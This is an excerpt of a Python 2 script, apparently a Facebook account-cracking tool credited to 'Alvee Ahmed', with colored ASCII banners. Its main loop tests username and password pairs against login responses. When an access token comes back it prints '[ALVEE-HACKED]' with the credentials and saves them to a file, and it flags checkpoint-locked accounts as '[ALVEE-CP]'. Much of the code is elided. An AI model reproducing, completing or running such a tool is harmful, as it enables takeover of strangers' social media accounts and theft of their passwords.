...
\033[0;94m  _____ _          
\033[0;94m |  _  | |_ _ ___ ___
\033[0;96m |     | | | | -_| -_|
\033[0;96m |__|__|_|\_/|___|___|
""")
 
print("\033[0;91mThis Tool's Free By Alvee Ahmed")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : Alvee Ahmed'
    print '\033[0;94mFACEBOOK : Tai Naki'
    print '\033[0;96mGITHUB   : Arman Hossain'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[ALVEE-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[ALVEE-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
